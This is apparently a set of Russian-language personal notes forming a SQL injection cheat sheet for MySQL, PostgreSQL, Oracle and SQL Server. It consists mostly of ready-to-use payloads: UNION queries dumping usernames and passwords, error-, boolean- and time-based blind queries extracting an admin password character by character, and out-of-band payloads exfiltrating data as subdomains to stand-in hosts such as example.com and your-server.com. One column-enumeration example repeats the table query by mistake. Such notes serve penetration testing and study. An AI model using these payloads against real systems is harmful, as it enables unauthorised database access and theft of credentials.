
# 1. Разведка

### **Где могут встречаться SQL-инъекции?**

SQL-инъекции могут встречаться в любом месте веб-приложения, где пользовательский ввод используется для формирования SQL-запросов. Это могут быть:

- **Поля ввода:** логин, пароль, поиск, фильтры и т.д.
- **Параметры URL:** GET-запросы (например, `?id=1`).
- **HTTP-заголовки:** `User-Agent`, `Cookie`, `Referer` и т.д.
- **JSON/XML-данные:** передаваемые в POST-запросах.


### **Обнаружение уязвимости**

#### **1. Пробовать различные кодировки**
Иногда приложение может экранировать или фильтровать ввод, но не обрабатывать специальные кодировки. Попробуйте:

- **URL-кодирование:** `'` → `%27`, `"` → `%22`, `#` → `%23`.
- **Двойное кодирование:** `%27` → `%2527`.
- **Unicode:** `'` → `\u0027`.
- **Hex-кодирование:** `'` → `0x27`.
- **HTML-сущности:** `'` → `&apos;`, `"` → `&quot;`.

#### **2. Использование символа одинарной кавычки (`'`)**
Одинарная кавычка используется в SQL для обозначения начала и конца строки. Если приложение не экранирует ввод, вставка `'` может нарушить синтаксис SQL-запроса и вызвать ошибку.

- **Примеры:**
```
'
''
```
- Если приложение возвращает ошибку (например, `SQL syntax error`), это может указывать на уязвимость.

#### **3. Двойные кавычки (`"`)**
Некоторые приложения используют двойные кавычки для обрамления строк в SQL-запросах. Если ввод не экранируется, это может привести к уязвимости.

- **Примеры:**
```
"
""
```
- Если приложение возвращает ошибку, это может указывать на уязвимость.

#### **4. Символы комментариев**
Символы комментариев (`--`, `#`, `/* */`) могут использоваться для обрезания части SQL-запроса. Это позволяет проверить, интерпретируется ли ввод как часть SQL-кода.

- **Примеры для разных СУБД:**

| Oracle      | Microsoft     | PostgreSQL    | MySQL                   |
| ----------- | ------------- | ------------- | ----------------------- |
| `--comment` | `--comment`   | `--comment`   | `#comment`              |
|             | `/*comment*/` | `/*comment*/` | `-- comment` С ПРОБЕЛОМ |
|             |               |               | `/*comment*/`           |

- **Пример использования:**
```
    ' -- 
    ' # 
    ' /*comment*/
```
- Если запрос выполняется без ошибок, это может указывать на уязвимость.

#### **5. Числовые значения**
Числовые значения полезны, если контекст SQL-инъекции числовой (например, `id = 1`). В этом случае можно использовать числа для проверки уязвимости.

- **Примеры:**
```
1
1+1
1-1
1*1
1/1
```
- Если приложение возвращает разные результаты для `1`, `1+1`, `1-1` и т.д., это может указывать на уязвимость.

- **Проверка на уязвимость:**    
```
?id=1 OR 1=1 -- 
```
Если запрос возвращает данные, это может указывать на уязвимость.

- Пример для проверки на ошибку:
```
?id=1 AND 1=2 -- 
```
Если запрос не возвращает данных, это также может указывать на уязвимость.

#### **6. Скобки (`()`)**
Скобки используются в SQL для группировки условий и вызовов функций. Они могут помочь в обнаружении уязвимостей, особенно если приложение использует сложные запросы.

- **Примеры:**
```
(1)
(1+1)
(SELECT 1)
```
- Если приложение возвращает данные для `(1)` или `(SELECT 1)`, это может указывать на уязвимость.

- **Проверка на уязвимость:**
```
?id=(1) OR 1=1 -- 
```
Если запрос возвращает данные, это может указывать на уязвимость.

- Пример для подзапроса:    
```
?id=(SELECT table_name FROM information_schema.tables LIMIT 1) -- 
```
Если запрос возвращает имя таблицы, это подтверждает уязвимость.

# 2. Исследование базы данных при атаках с использованием SQL-инъекций

- #### [[Примеры SQL-запросов, подверженных инъекциям, в различном контексте]]

- #### [[Примеры SQL-запросов, подверженных инъекциям, в различных операторах]]

## MySQL

Обнаружить можно как я уже выше писал различными способами в зависимости от контекста.
```
'

"

1 OR 1=1 -- 

(1+1) 

' SELECT SLEEP(10) -- 

' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.example.com\\test')) -- #
```

### Видимая атака

#### 1. Этап определяем количество столбцов при объединение запроса

- **Определение количества столбцов**
```
' UNION SELECT NULL,NULL,NULL-- 

' UNION SELECT 'a',NULL,NULL,NULL-- # определяем какая строка может выдать полезную нагрузку
```

#### 2. Этап определяем версию 

- **Получение версии:**
```
' UNION SELECT NULL, @@version --
```

#### 3. Этап определяем таблицы

- **Вывод всех таблиц**
```
' UNION SELECT * FROM information_schema.tables # вывод всех таблиц

' SELECT * FROM information_schema.columns WHERE table_name = 'Users' # вывод всех столбцов а таблице Users
```

#### 4. Этап вывод данных с таблиц

- **При 1 полезном столбце**
```
' UNION SELECT username || '~' || password FROM users--
```

- **При нескольких полезных столбцах**
```
' UNION SELECT NULL, NULL, username, password FROM users--
```

### Слепая атака

#### Через вывод ошибки

- **Логика вывода данных через ошибку:**
```
' AND CAST((SELECT 1) AS int)-- # 
```
Пояснение: `CAST()`функция позволяет преобразовывать один тип данных в другой, тем самым если мы видим вывод об ошибки sql то можем использовать данный метод.

- **1. Вывод версии базы данных**
```
' AND CAST((SELECT @@version) AS int)-- #
```
- Здесь `@@version` возвращает версию MySQL. Если преобразование в `int` невозможно, сервер вернет ошибку, в которой может быть указана версия базы данных.

- **2. Вывод таблиц в базе данных**
```
' AND CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1) AS int)-- 
```
- Здесь `information_schema.tables` содержит информацию о всех таблицах в базе данных. `DATABASE()` возвращает имя текущей базы данных. `LIMIT 1` ограничивает вывод одной строкой, что полезно для пошагового извлечения данных.

- **3. Вывод данных из столбца в таблице**
```
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- 
```
- Здесь мы пытаемся преобразовать значение столбца `username` из таблицы `users` в тип `int`. Если преобразование невозможно, сервер вернет ошибку, в которой может быть указано значение `username`.

##### Что делает `LIMIT` и почему полезно его использовать
`LIMIT` используется для ограничения количества строк, возвращаемых запросом. Это особенно полезно в контексте SQL-инъекций, так как позволяет извлекать данные по частям, что может быть важно для обхода ограничений или для уменьшения количества данных, передаваемых в одном запросе.

Пример использования `LIMIT`:
```
' AND 1=CAST((SELECT username FROM users LIMIT 1 OFFSET 0) AS int)-- 
```
- Здесь `LIMIT 1` ограничивает вывод одной строкой, а `OFFSET 0` указывает на то, что нужно начать с первой строки. Для извлечения следующих строк можно увеличивать значение `OFFSET`:

```
' AND 1=CAST((SELECT username FROM users LIMIT 1 OFFSET 1) AS int)-- 
```
- Этот запрос вернет вторую строку из столбца `username`.

#### Через условную ошибку

- **Логика вывода данных через синтаксическую ошибку:**
```
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a' -- # не вызовет ошибку
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a' -- # вызовет ошибку
```

- **1. Получение версии:**
```
' AND (SELECT CASE WHEN (SUBSTRING(@@version, 1, 1) = '5') THEN 1/0 ELSE 'a' END)='a' -- # если версия начинается с 5, вызовет ошибку
```
Пояснение: числа `1,1` в `SUBSTRING`: начальная_позиция, длина. То есть
-  1, 2:
    Извлекает 2 символа, начиная с первого символа.
    Например, для версии `5.7.35` результат будет `5.`.
-  2, 1:
	Извлекает 1 символ, начиная с второго символа.
	Например, для версии `5.7.35` результат будет `.`.


- **2. Определение таблиц:**
```
' AND (SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1), 1, 1) = 'a') THEN 1/0 ELSE 'a' END)='a' -- #
```
- `LIMIT 1` возвращает только одну таблицу (первую в списке).
- `SUBSTRING(..., 1, 1)` извлекает первый символ названия таблицы.

- **3. Определение название столбцов в бд:**
```
' AND (SELECT CASE WHEN (SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'users' LIMIT 1), 1, 1) = 'a') THEN 1/0 ELSE 'a' END)='a' -- #
```
- `information_schema.columns` содержит информацию о всех столбцах в базе данных.
- `table_schema = DATABASE()` ограничивает выборку текущей базой данных.
- `table_name = 'users'` указывает на конкретную таблицу.
- `LIMIT 1` возвращает только один столбец (первый в списке).
- `SUBSTRING(..., 1, 1)` извлекает первый символ названия столбца.

- **4. Вывод данных из столбца в таблице:**
```
' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username = 'admin' LIMIT 1), 1, 1) = 'a') THEN 1/0 ELSE 'a' END)='a' -- # если первый символ пароля 'a', вызовет ошибку
```

##### Зачем нужен `LIMIT`?
**`LIMIT`** используется для ограничения количества строк, возвращаемых запросом. В контексте SQL-инъекций:
    1. **Пошаговое извлечение данных:**
        - Без `LIMIT` запрос может вернуть несколько строк, что вызовет ошибку или неоднозначность.
        - С `LIMIT 1` можно извлекать данные по одной строке за раз.
    2. **Уменьшение нагрузки:**
        - Извлечение одной строки требует меньше ресурсов и времени.
    3. **Обход ограничений:**
        - Некоторые базы данных или приложения могут блокировать запросы, возвращающие много данных.
- **Пример использования `LIMIT` и `OFFSET`:**
```
' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1 OFFSET 0), 1, 1) = 'a') THEN 1/0 ELSE 'a' END)='a' -- #
```
- `LIMIT 1 OFFSET 0` возвращает первую строку.
- `LIMIT 1 OFFSET 1` возвращает вторую строку и т.д.

#### Через задержку времени

- **Логика вывода данных через задержку времени:**
```
'; IF (1=2) THEN SLEEP(10); END IF; -- # не вызовет задержку
'; IF (1=1) THEN SLEEP(10); END IF; -- # вызовет задержку
```


- **1. Получение версии бд:**
```
'; IF (SUBSTRING(@@version, 1, 1) = '5') THEN SLEEP(10); END IF; -- 
```


- **2. Определение таблиц:**
```
'; IF (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1), 1, 1) = 'a') THEN SLEEP(10); END IF; -- #
```
- `LIMIT 1` возвращает только одну таблицу (первую в списке).
- `LIMIT 1 OFFSET 1` возвращает вторую строку и т.д.


- **3. Определение название столбцов в бд:**
```
'; IF (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1), 1, 1) = 'a') THEN SLEEP(10); END IF; -- #
```
- `information_schema.columns` содержит информацию о всех столбцах в базе данных.
- `table_schema = DATABASE()` ограничивает выборку текущей базой данных.
- `table_name = 'users'` указывает на конкретную таблицу.
- `LIMIT 1` возвращает только один столбец (первый в списке).
- `LIMIT 1 OFFSET 1` возвращает вторую строку и т.д.
- `SUBSTRING(..., 1, 1)` извлекает первый символ названия столбца.


- **4. Вывод данных их столбца в таблице:**
```
'; IF (SUBSTRING((SELECT password FROM users WHERE username = 'admin' LIMIT 1), 1, 1) = 'a') THEN SLEEP(10); END IF; -- #
```
- `LIMIT 1 OFFSET 1` возвращает вторую строку и т.д.

#### C использованием внеполосных методов (OAST)

- **Логика вывода данных через обращение на наш сервер:**
Использование `LOAD_FILE()`:
- Функция `LOAD_FILE()` может читать содержимое файла и возвращать его как строку. Если указать URL, она может выполнить HTTP-запрос.
- Пример:
```
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.example.com\\test')) -- #
```
Здесь `@@version` передается как поддомен на сервер `example.com`.

Использование `INTO OUTFILE`:
- Функция `INTO OUTFILE` позволяет записывать данные в файл. Если указать путь к сетевому ресурсу, данные могут быть отправлены на внешний сервер.
- Пример:
```
SELECT 'data' INTO OUTFILE '\\\\example.com\\share\\output.txt';
```

- **1. Получение версии бд:**
```
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.example.com\\test')) -- #
```
- `CONCAT('\\\\', (SELECT @@version), '.example.com\\test')` формирует URL, например: `\\5.7.35.example.com\test`.
- `LOAD_FILE()` выполняет HTTP-запрос на этот URL, передавая версию базы данных как поддомен.

- **2. Определение таблиц:**
```
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE() LIMIT 1), '.example.com\\test')) -- #
```
- `information_schema.tables` содержит информацию о всех таблицах в базе данных.
- `table_schema = DATABASE()` ограничивает выборку текущей базой данных.
- `LIMIT 1` возвращает только одну таблицу (первую в списке).
- `CONCAT('\\\\', (SELECT table_name), '.example.com\\test')` формирует URL, например: `\\users.example.com\test`.
- `LOAD_FILE()` выполняет HTTP-запрос на этот URL, передавая название таблицы как поддомен.

- **3. Определение название столбцов в бд:**
```
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT column_name FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'users' LIMIT 1), '.example.com\\test')) -- #
```
- `information_schema.columns` содержит информацию о всех столбцах в базе данных.
- `table_schema = DATABASE()` ограничивает выборку текущей базой данных.
- `table_name = 'users'` указывает на конкретную таблицу.
- `LIMIT 1` возвращает только один столбец (первый в списке).
- `CONCAT('\\\\', (SELECT column_name), '.example.com\\test')` формирует URL, например: `\\id.example.com\test`.
- `LOAD_FILE()` выполняет HTTP-запрос на этот URL, передавая название столбца как поддомен.

- **4. Вывод данных их столбца в таблице:**
```
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username = 'admin' LIMIT 1), '.example.com\\test')) -- #
```
- `SELECT password FROM users WHERE username = 'admin'` выбирает пароль для пользователя `admin`.
- `LIMIT 1` ограничивает результат одной строкой.
- `CONCAT('\\\\', (SELECT password), '.example.com\\test')` формирует URL, например: `\\admin123.example.com\test`.
- `LOAD_FILE()` выполняет HTTP-запрос на этот URL, передавая данные из столбца как поддомен.

## PostgreSQL

- **Обнаружение:**
```
'
```

- **Получение версии:**
```
' UNION SELECT version(), NULL --
```

- **Задержка времени:**
```
'; SELECT pg_sleep(5) --
```

- **Вывод конф. данных с ошибкой:**
```
' AND 1=CAST((SELECT current_database()) AS int) --
```

- **Пингуем сервер наш:**
```
'; SELECT * FROM dblink('host='||(SELECT current_database())||'.your-server.com user=test dbname=test', 'SELECT 1') --
```

## Oracle

- **Обнаружение:**
```
'
```

- **Получение версии:**
```
' UNION SELECT banner, NULL FROM v$version --
```

- **Задержка времени:**
```
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a', 5) --
```

- **Вывод конф. данных с ошибкой:**
```
' AND 1=CAST((SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM DUAL) AS int) --
```

- **Пингуем сервер наш:**
```
' || UTL_HTTP.REQUEST('http://'||(SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM DUAL)||'.your-server.com') --
```

## SQL Server

- **Обнаружение:**
```
'
```

- **Получение версии:**
```
' UNION SELECT @@version, NULL --
```

- **Задержка времени:**
```
'; WAITFOR DELAY '0:0:5' --
```

- **Вывод конф. данных с ошибкой:**
```
' AND 1=CAST((SELECT DB_NAME()) AS int) --
```

- **Пингуем сервер наш:**
```
'; DECLARE @p varchar(1024); SET @p=(SELECT DB_NAME()); EXEC('master..xp_dirtree "\\'+@p+'.your-server.com\test"') --
```




# 3. Дополнение

- [Шпаргалка по инъекциям на portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [[Инструмент SQLmap]]
- [Список payloads с гитхаб](https://github.com/payloadbox/sql-injection-payload-list)